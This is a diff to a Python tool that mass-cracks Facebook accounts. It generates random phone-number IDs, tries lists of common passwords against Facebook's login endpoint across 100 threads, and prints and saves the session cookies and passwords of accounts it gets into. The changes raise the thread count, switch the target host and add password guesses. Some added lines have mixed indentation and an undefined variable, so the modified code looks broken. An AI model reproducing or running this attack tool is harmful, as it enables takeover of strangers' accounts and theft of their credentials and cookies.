@@ -1355,7 +1355,10 @@ def ff():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru[3:],code+guru,guru[1:],'Bangladesh','bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','iloveallah','i love allah','456789','102030','203040','304050','405060','135790','0987654321','20042004','19971997','321321']
+			pwx = [guru[3:],kode+guru,guru[1:],'Bangladesh','bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','iloveallah','i love allah','456789','102030','203040','304050','405060','135790','0987654321','20042004','19971997','321321']
+            for sudair in HamiiID:
+                pwx.append(sudair)
+                pwx.append(guru)
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1379,7 +1382,7 @@ def bd():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
-	with ThreadPool(max_workers=70) as yaari:
+	with ThreadPool(max_workers=100) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
@@ -1390,7 +1393,10 @@ def bd():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'+88','bangladish']
+			pwx = [guru[3:],kode+guru,guru[1:],'Bangladesh','bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','iloveallah','i love allah','456789','102030','203040','304050','405060','135790','0987654321','20042004','19971997','321321']
+            for sudair in HamiiID:
+                pwx.append(Eman)
+                pwx.append(guru)
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1429,7 +1435,7 @@ def chos():
     for bilal in range(passx):
         pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
         HamiiID.append(pww)
-    with ThreadPool(max_workers=70) as manshera:
+    with ThreadPool(max_workers=100) as manshera:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -1456,7 +1462,7 @@ def fcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1467,7 +1473,8 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {
+    'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
@@ -1482,14 +1489,15 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
+}
+            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[ABKHANX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[ABKHANX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎✅]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('ABKHANX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
